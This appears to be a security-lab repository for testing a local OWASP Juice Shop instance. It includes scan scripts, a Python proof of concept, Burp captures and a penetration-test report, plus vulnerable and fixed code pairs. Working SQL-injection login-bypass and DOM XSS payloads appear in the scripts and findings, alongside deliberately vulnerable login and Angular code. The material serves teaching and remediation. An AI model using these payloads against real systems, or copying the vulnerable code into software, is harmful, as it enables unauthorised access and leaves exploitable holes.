# Web-Application-Security-Testing
Perform security testing on a local or intentionally vulnerable web application.
#!/usr/bin/env bash
# ==============================================================================
# Web Application Security Testing - Lab Setup & Automated Verification Script
# Target: OWASP Juice Shop (127.0.0.1:3000)
# ==============================================================================

set -euo pipefail

TARGET_URL="http://127.0.0.1:3000"
CONTAINER_NAME="juice-shop"
SCAN_DIR="./scans"

mkdir -p "$SCAN_DIR"

echo "[*] Step 1: Deploying isolated OWASP Juice Shop container on 127.0.0.1:3000..."
if ! docker ps -a --format '{{.Names}}' | grep -q "^${CONTAINER_NAME}$"; then
    docker run -d --name "$CONTAINER_NAME" -p 127.0.0.1:3000:3000 bkimminich/juice-shop
else
    docker start "$CONTAINER_NAME" >/dev/null
fi

echo "[*] Waiting for application to initialize..."
until curl -s -o /dev/null "$TARGET_URL"; do
    sleep 2
done
echo "[+] Target is live at $TARGET_URL"

echo "[*] Step 2: Running Nikto Web Server & Misconfiguration Scan..."
nikto -h "$TARGET_URL" -Tuning 123bde -o "${SCAN_DIR}/nikto_scan_output.txt" -Format txt
echo "[+] Nikto report saved to ${SCAN_DIR}/nikto_scan_output.txt"

echo "[*] Step 3: Verifying Exposed /ftp Directory (Security Misconfiguration)..."
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}/ftp")
echo "[+] GET /ftp returned HTTP $HTTP_STATUS"

echo "[*] Step 4: Testing SQL Injection Authentication Bypass (POST /rest/user/login)..."
SQLI_RESPONSE=$(curl -s -X POST "${TARGET_URL}/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"invalid_password"}')

if echo "$SQLI_RESPONSE" | grep -q '"token"'; then
    echo "[!] CRITICAL: SQL Injection Authentication Bypass Confirmed! Admin JWT issued."
    echo "$SQLI_RESPONSE" | jq . > "${SCAN_DIR}/sqli_poc_response.json" 2>/dev/null || echo "$SQLI_RESPONSE" > "${SCAN_DIR}/sqli_poc_response.json"
else
    echo "[-] SQLi check did not return a token."
fi

echo "[*] Assessment automation complete."


#!/usr/bin/env python3
"""
Web Application Security Assessment - Automated PoC & Header Auditor
Target: Local OWASP Juice Shop Instance (http://127.0.0.1:3000)
"""

import json
import requests

BASE_URL = "http://127.0.0.1:3000"

REQUIRED_SECURITY_HEADERS = [
    "Content-Security-Policy",
    "Strict-Transport-Security",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
]


def audit_security_headers(session: requests.Session) -> dict:
    """Check HTTP response headers for missing defensive configurations."""
    resp = session.get(BASE_URL, timeout=10)
    missing = [h for h in REQUIRED_SECURITY_HEADERS if h not in resp.headers]
    return {
        "status_code": resp.status_code,
        "cors_header": resp.headers.get("Access-Control-Allow-Origin", "Not Set"),
        "missing_headers": missing,
    }


def test_sqli_auth_bypass(session: requests.Session) -> dict:
    """Test POST /rest/user/login for SQL injection tautology bypass."""
    login_url = f"{BASE_URL}/rest/user/login"
    payload = {
        "email": "admin@juice-sh.op'--",
        "password": "arbitrary_password",
    }
    resp = session.post(login_url, json=payload, timeout=10)
    data = resp.json() if resp.status_code == 200 else {}
    auth_success = "authentication" in data and "token" in data["authentication"]

    return {
        "endpoint": "/rest/user/login",
        "payload": payload,
        "http_status": resp.status_code,
        "vulnerable": auth_success,
        "authenticated_email": data.get("authentication", {}).get("umail"),
        "token_preview": (
            data["authentication"]["token"][:32] + "..." if auth_success else None
        ),
    }


def check_exposed_endpoints(session: requests.Session) -> list:
    """Probe sensitive directories identified during Nikto reconnaissance."""
    sensitive_paths = ["/ftp", "/ftp/acquisitions.md", "/ftp/package.json.bak", "/metrics"]
    findings = []
    for path in sensitive_paths:
        resp = session.get(f"{BASE_URL}{path}", timeout=10)
        findings.append({
            "path": path,
            "http_status": resp.status_code,
            "content_length": len(resp.content),
            "exposed": resp.status_code == 200,
        })
    return findings


def main():
    session = requests.Session()
    report = {
        "target": BASE_URL,
        "header_audit": audit_security_headers(session),
        "sqli_test": test_sqli_auth_bypass(session),
        "directory_exposure": check_exposed_endpoints(session),
    }
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()

    ================================================================================
FINDING 1: SQL Injection Authentication Bypass (CWE-89)
Endpoint: POST /rest/user/login
================================================================================

--- [REQUEST: Burp Suite Repeater] ---
POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 55
Origin: http://127.0.0.1:3000
Connection: close

{"email":"admin@juice-sh.op'--","password":"anything"}

--- [RESPONSE: 200 OK (Authentication Bypassed)] ---
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Connection: close

{
  "authentication": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.[REDACTED_JWT_PAYLOAD]",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}

================================================================================
FINDING 2: DOM-Based Cross-Site Scripting (CWE-79)
Endpoint: GET /#/search?q=
================================================================================

--- [PAYLOAD INJECTED IN BROWSER URL / SEARCH INPUT] ---
http://127.0.0.1:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60XSS_Verified%60)%22%3E

--- [DECODED DOM SINK RENDERING] ---
<span id="searchValue"><iframe src="javascript:alert(`XSS_Verified`)"></span>


// VULNERABLE: Direct concatenation allows SQL syntax breakout via single quotes
app.post('/rest/user/login', async (req, res, next) => {
  const email = req.body.email || '';
  const hashedPassword = security.hash(req.body.password || '');

  const [users] = await models.sequelize.query(
    `SELECT * FROM Users WHERE email = '${email}' AND password = '${hashedPassword}' AND deletedAt IS NULL`
  );

  if (users.length > 0) {
    return res.status(200).json({ authentication: generateToken(users[0]) });
  }
  return res.status(401).send('Invalid email or password.');
});



// SECURE: Parameterized query binds user input strictly as literal data
const validator = require('validator');
const bcrypt = require('bcrypt');

app.post('/rest/user/login', async (req, res, next) => {
  const { email, password } = req.body;

  // 1. Strict format validation before querying the database
  if (typeof email !== 'string' || !validator.isEmail(email) || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input format.' });
  }

  // 2. Use Sequelize ORM parameterized lookup (prevents SQLi completely)
  const user = await UserModel.findOne({
    where: {
      email: email.trim().toLowerCase(),
      deletedAt: null,
    },
  });

  // 3. Constant-time password verification using bcrypt
  if (!user || !(await bcrypt.compare(password, user.password))) {
    return res.status(401).json({ error: 'Invalid email or password.' });
  }

  return res.status(200).json({ authentication: generateToken(user) });
});



// VULNERABLE: Explicitly trusting untrusted URL query parameters as raw HTML
import { Component, OnInit } from '@angular/core';
import { ActivatedRoute } from '@angular/router';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Component({
  selector: 'app-search-result',
  template: `<span [innerHTML]="trustedSearchQuery"></span>`
})
export class SearchResultComponent implements OnInit {
  trustedSearchQuery: SafeHtml = '';

  constructor(private route: ActivatedRoute, private sanitizer: DomSanitizer) {}

  ngOnInit(): void {
    this.route.queryParams.subscribe(params => {
      const rawQuery = params['q'] || '';
      // DANGEROUS: Disables Angular's XSS protection
      this.trustedSearchQuery = this.sanitizer.bypassSecurityTrustHtml(rawQuery);
    });
  }
}



// SECURE: Use Angular's default interpolation {{ }} which auto-encodes HTML entities
import { Component, OnInit } from '@angular/core';
import { ActivatedRoute } from '@angular/router';

@Component({
  selector: 'app-search-result',
  // SAFE: Double-curly-brace interpolation automatically escapes <, >, &, ", and '
  template: `<span>{{ searchQuery }}</span>`
})
export class SearchResultComponent implements OnInit {
  searchQuery: string = '';

  constructor(private route: ActivatedRoute) {}

  ngOnInit(): void {
    this.route.queryParams.subscribe(params => {
      this.searchQuery = typeof params['q'] === 'string' ? params['q'] : '';
    });
  }
}


const express = require('express');
const helmet = require('helmet');
const cors = require('cors');

const app = express();

// 1. Enforce strict HTTP security headers (CSP, X-Frame-Options, nosniff, HSTS)
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", 'data:'],
        objectSrc: ["'none'"],
        frameAncestors: ["'none'"],
      },
    },
    frameguard: { action: 'deny' },
    noSniff: true,
  })
);

// 2. Restrict CORS to trusted frontend origins instead of wildcard '*'
app.use(
  cors({
    origin: ['http://127.0.0.1:3000'],
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    credentials: true,
  })
);

// 3. Remove public directory listing on /ftp and enforce admin authentication
app.use('/ftp', authenticateAdmin, (req, res) => {
  return res.status(403).json({ error: 'Directory listing is disabled.' });
});




MARKDOWN

# Web Application Security Assessment Report

**Target Application:** OWASP Juice Shop (v17.x Local Instance)  
**Target URI:** `http://127.0.0.1:3000`  
**Assessment Type:** Gray-Box Web Application Penetration Test  
**Methodology Standard:** OWASP Web Security Testing Guide (WSTG v4.2)  
**Environment:** Isolated Kali Linux VM + Docker (`127.0.0.1` loopback binding)  

---

## 1. Executive Summary

A security assessment was conducted against a locally deployed instance of **OWASP Juice Shop** to identify exploitable vulnerabilities, evaluate server configuration posture, and provide actionable remediation guidance. Testing combined automated reconnaissance using **Nikto** with manual traffic interception, payload crafting, and session manipulation via **Burp Suite Community Edition**.

The assessment identified **four security findings** across authentication, client-side rendering, and server configuration layers, including a **Critical SQL Injection** vulnerability enabling unauthenticated administrative takeover and a **High-severity DOM-based Cross-Site Scripting (XSS)** flaw.

| ID | Vulnerability Title | Severity | CVSS v3.1 | CWE | Status |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **VULN-01** | Authentication Bypass via SQL Injection | **Critical** | 9.8 | CWE-89 | Exploited |
| **VULN-02** | DOM-Based Cross-Site Scripting (XSS) in Search | **High** | 7.1 | CWE-79 | Exploited |
| **VULN-03** | Unauthenticated Sensitive File Exposure (`/ftp`) | **Medium** | 6.5 | CWE-548 | Verified |
| **VULN-04** | Missing HTTP Security Headers & Permissive CORS | **Medium** | 5.3 | CWE-16 | Verified |

---

## 2. Scope & Testing Methodology

### 2.1 Scope Boundaries
* **In-Scope Host:** `http://127.0.0.1:3000` (Isolated Docker container on Kali Linux).
* **Out-of-Scope:** External internet hosts, Denial-of-Service (DoS) stress testing, and host hypervisor infrastructure.

### 2.2 Testing Phases (OWASP WSTG v4.2)
1. **Environment Provisioning & Isolation:** Deployed OWASP Juice Shop bound strictly to `127.0.0.1` to prevent external network exposure.
2. **Automated Reconnaissance:** Executed Nikto (`-Tuning 123bde`) to fingerprint server technologies, enumerate exposed directories, and audit HTTP response headers.
3. **Manual Proxy Interception:** Configured Firefox with Burp Suite (`127.0.0.1:8080`) to inspect REST API endpoints, JWT tokens, and client-side routing parameters.
4. **Exploitation & Impact Validation:** Tested authentication endpoints for SQL injection and DOM sinks for unescaped JavaScript execution.

![Lab Setup Verification](../screenshots/01_lab_docker_setup.png)

---

## 3. Detailed Technical Findings

### VULN-01: Authentication Bypass via SQL Injection
* **Severity:** Critical (CVSS v3.1: `9.8` — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
* **CWE Mapping:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
* **Affected Endpoint:** `POST /rest/user/login`

#### Technical Description
The login API endpoint concatenates the user-supplied `email` parameter directly into a raw SQLite query without parameterization. Submitting a single quote (`'`) triggers an unhandled database syntax error, while injecting a SQL comment sequence (`'--`) terminates the query immediately after the email comparison, bypassing password verification entirely.

#### Reproduction Steps
1. Intercept a login request to `POST /rest/user/login` in Burp Suite Proxy and forward it to **Burp Repeater**.
2. Modify the JSON request body to:
   ```json
   {
     "email": "admin@juice-sh.op'--",
     "password": "invalid_password"
   }



  PLAINTEXT

  [http://127.0.0.1:3000/#/search?q=](http://127.0.0.1:3000/#/search?q=)<iframe src="javascript:alert(`XSS_Verified`)">
